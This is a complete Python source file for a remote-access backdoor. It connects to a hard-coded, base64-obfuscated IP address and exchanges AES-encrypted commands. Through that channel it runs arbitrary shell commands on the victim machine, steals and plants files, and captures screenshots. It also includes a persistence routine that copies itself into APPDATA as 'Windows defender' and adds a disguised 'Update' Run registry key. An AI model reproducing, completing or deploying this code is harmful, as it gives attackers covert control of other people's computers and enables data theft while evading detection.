#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import base64
from Crypto.Cipher import AES
import shutil

import sys
import tempfile
import pyautogui

base64decoderegistry1 = base64.b64decode('cmVnIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBVcGRhdGUgL3QgUkVHX1NaIC9kICI=')
base64decoderegistry2 = base64.b64decode('Ig==')
ip = base64.b64decode('NjcuMjA1LjE2NS4xMDU=')
decryptionkey = base64.b64decode('am9ueWpvbnkgeWVzcGFwYQ==')
windowsdefender = base64.b64decode('XFdpbmRvd3MgZGVmZW5kZXI=')
appdata = base64.b64decode('YXBwZGF0YQ==')


class Backdoor:
    def __init__(self):
        # self.persistance()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((str(ip, 'utf-8'), 5050))
        self.key = str.encode(str(decryptionkey, 'utf-8'))
        self.iv = str.encode(str(decryptionkey, 'utf-8'))

    def persistance(self):
        self.evil_file_location = os.environ[str(appdata, 'utf-8')] + str(windowsdefender, 'utf-8')
        if not os.path.exists(self.evil_file_location):
            shutil.copyfile(sys.executable, self.evil_file_location)
            subprocess.check_output(str(base64decoderegistry1, 'utf-8') + self.evil_file_location + str(base64decoderegistry2, 'utf-8'), shell=True)

    def encrypt(self, plain_text):
        if len(plain_text) % 16 != 0:
            add_pad = 16 - (len(plain_text) % 16)
            while add_pad != 0:
                plain_text += " "
                add_pad -= 1
        obj = AES.new(self.key, AES.MODE_CBC, self.iv)
        cipher = obj.encrypt(str.encode(plain_text))
        return cipher

    def decrypt(self, cipher):
        obj = AES.new(self.key, AES.MODE_CBC, self.iv)
        plain_text = obj.decrypt(cipher)
        json_data = json.loads(plain_text)
        return json_data

    def reliable_send(self, data):
        json_data = json.dumps(data)
        encrypted_data = self.encrypt(json_data)
        self.connection.send(encrypted_data)

    def reliable_receive(self):
        data = b''
        while True:
            try:
                data = data + self.connection.recv(1024)
                json_data = self.decrypt(data)
                return json_data
            except Exception:
                continue

    def capture_screenshot(self):
        temp_directory = tempfile.gettempdir()
        os.chdir(temp_directory)
        subprocess.call("mkdir _MEI242437", shell=True)
        os.chdir(temp_directory + "/_MEI242437")
        img = pyautogui.screenshot()
        name = "img.jpg"
        img.save(name)
        return self.read_file(name)

    def execute_command_output(self, command):
        shell_command = ''
        if len(command) > 0:
            for i in command:
                shell_command += i + " "
        devnull = open(os.devnull, 'wb')
        data = subprocess.check_output(shell_command, shell=True, stderr=devnull, stdin=devnull)
        return str(data, 'utf-8')

    def read_file(self, file):
        with open(file, "rb") as read:
            data = base64.b64encode(read.read())
            data = json.dumps(str(data, 'utf-8'))
        return data

    def write_file(self, path, content):
        content = base64.b64decode(content)
        with open(path, "wb") as write:
            write.write(content)

    def change_directory(self, path):
        actual_path = ""
        y = len(path) - 1
        x = 1
        while y > 0:
            actual_path += path[x] + " "
            x += 1
            y -= 1
        os.chdir(actual_path[:-1])
        return "[+]Changing the working directory to " + actual_path

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "cd" and len(command) > 1:
                    result = self.change_directory(command)
                    self.reliable_send(result)
                elif command[0] == "download":
                    file_content = self.read_file(command[1])
                    self.reliable_send(file_content)
                elif command[0] == "upload":
                    file_content = base64.b64decode(self.reliable_receive())
                    self.write_file(command[1], file_content)
                elif command[0] == "screenshot":
                    data = self.capture_screenshot()
                    self.reliable_send(data)
                elif command[0] == "connected":
                    self.reliable_send('A19365')
                elif command[0] == "exit":
                    self.reliable_send("connection closed")
                    self.connection.close()
                    sys.exit(0)
                else:
                    command_result = self.execute_command_output(command)
                    self.reliable_send(command_result)
            except Exception as msg:
                self.reliable_send("An exception occurred: " + str(msg))
                continue


# while True:
    # try:
my_backdoor = Backdoor()
my_backdoor.run()
    # except Exception:
    #     continue
